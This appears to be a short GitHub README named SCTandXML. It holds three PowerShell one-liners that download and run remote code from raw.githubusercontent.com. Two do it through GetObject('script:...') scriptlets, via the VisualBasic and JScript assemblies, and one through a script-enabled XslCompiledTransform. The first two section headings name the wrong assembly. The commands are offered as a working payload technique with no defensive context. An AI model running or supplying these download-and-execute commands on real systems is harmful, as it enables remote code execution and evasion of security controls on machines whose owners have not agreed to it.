# SCTandXML

SCT via Microsoft.JScript:

[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.sct').Exec(0)

SCT via Microsoft.VisualBasic:

[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

XML via Transform Object:

$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.xsl',$s,$r);$x.Transform('https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.xml','z');del z;
